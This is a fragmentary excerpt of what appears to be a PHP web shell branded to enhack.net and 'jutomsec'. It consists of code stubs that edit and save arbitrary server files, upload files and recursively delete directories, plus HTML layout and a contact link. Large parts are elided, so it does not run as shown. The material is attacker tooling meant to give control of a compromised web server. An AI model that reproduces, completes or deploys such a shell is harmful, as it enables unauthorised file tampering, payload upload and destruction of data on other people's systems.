...
function def()
{
	...
	<a href="http://enhack.net"><img border="0" src="http://imageupload.giz9.info/5293/securemt9_m.jpg"></a><br>
	</p>
	...
	if(is_file($fedit)) {
		if ($fedit != "" ){
			...
			if ($savefile <> "") {
				...
				} else {					echo '<script language="javascript"> alert("Save Failed!")</script>';
				}
...
if ($rpath <> "") {
	...
	} else {		echo '<script language="javascript"> alert("\:( Upload Failed!")</script>';
	}
}
...
if ($frpath <> "") {
	if(rmdirr($frpath)) {		echo '<script language="javascript"> alert("Done! Press F5 to refresh")</script>';
	} else {		echo '<script language="javascript"> alert("Fail! Press F5 to refresh")</script>';
	}
	...
	<table border="1" width="98%" style="border: 1px solid #0080FF" cellspacing="0" cellpadding="0" height="600">
		<tr>
			<td valign="top" rowspan="2">
				<p align="center"><b>
					<br><a href="?"><img border="0" src="http://imageupload.giz9.info/5293/jutomsec3.png"></a>
				</p>
				<p align="center">=====[~]=====</p>
				<p align="center"><b>
				...
				<p align="center"><b>
				<font face="Tahoma" size="2" color="#0080FF">
					<a href="mailto:jutoms@enhack.net" alt="Contact">Contact<br><br><img border="0" src="http://img355.imageshack.us/img355/9250/jutomsec3.png"></a>
				</font></b></p>
			</td>
